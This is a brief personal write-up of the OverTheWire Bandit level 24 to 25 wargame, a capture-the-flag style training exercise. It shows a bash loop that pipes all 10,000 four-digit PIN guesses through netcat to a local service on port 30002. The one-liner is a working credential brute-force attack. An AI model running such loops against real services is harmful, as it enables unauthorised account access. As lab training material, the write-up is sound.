# Bandit Level 24 → 25

## Objective
Brute-force a 4-digit PIN on port 30002.

## Tools Used
- Bash loop, `nc`, Brute-force

## Process
`for i in {0000..9999}; do echo "PASS $i"; done | nc localhost 30002`

## What I Learned
- Automating credential brute-forcing via the shell.
